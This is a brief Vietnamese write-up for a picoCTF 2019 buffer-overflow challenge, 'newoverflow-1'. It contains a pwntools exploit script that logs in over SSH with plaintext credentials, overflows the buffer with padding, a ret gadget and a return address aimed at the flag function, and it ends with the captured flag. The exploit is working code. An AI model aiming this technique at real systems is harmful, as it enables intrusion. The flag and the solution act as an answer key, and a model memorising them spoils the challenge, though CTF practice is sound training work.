# Solution 
### Bài này thì easy thôi, chỉ cần mình fill đầy offset và ret về hàm `flag` coi như solve được bài này.

### Đây là file exploit.py của mình
```sh
from pwn import *
#s = process("./vuln")
ss = ssh(host = '2019shell1.picoctf.com',user = 'hazir', password = '2k4')
s = ss.run("cd  /problems/newoverflow-1_1_39d472170ee5080cac1226374a7101a7 ; ./vuln")
ret_gadget = 0x00000000004005de
pl = "a"* 0x48 + p64(ret_gadget) +  p64(0x400767)
s.sendline(pl)
s.interactive()
``` 

Run và nhận flag thôi: `picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_cfe23f2b}`